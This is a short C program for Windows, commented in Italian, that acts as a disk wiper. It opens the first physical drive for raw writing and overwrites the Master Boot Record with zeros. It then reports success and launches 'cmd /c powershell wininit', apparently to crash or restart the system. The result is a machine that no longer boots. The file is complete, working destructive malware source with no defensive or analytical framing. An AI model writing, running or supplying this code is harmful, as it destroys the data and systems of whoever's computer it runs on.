#include <stdio.h>
#include <windows.h>

int main() {
    HANDLE hDevice;
    DWORD bytesWritten;
    char zeroBuffer[512] = {0}; // Buffer filled with zeroes

    // Apertura del disco rigido in modalità di scrittura
    hDevice = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("Errore nell'apertura del disco. Assicurati di avere i privilegi necessari.\n");
        return 1;
    }

    // Sposta il cursore alla posizione 0 per scrivere il MBR
    SetFilePointer(hDevice, 0, NULL, FILE_BEGIN);

    // Scrivi zeri sul MBR
    if (!WriteFile(hDevice, zeroBuffer, 512, &bytesWritten, NULL)) {
        printf("Errore nella scrittura del MBR.\n");
        CloseHandle(hDevice);
        return 1;
    }

    printf("MBR sovrascritto con successo!\n");

    // Chiudi il gestore del dispositivo
    CloseHandle(hDevice);

    // Esegui il comando powershell wininit tramite cmd
    system("cmd /c powershell wininit");

    return 0;
}

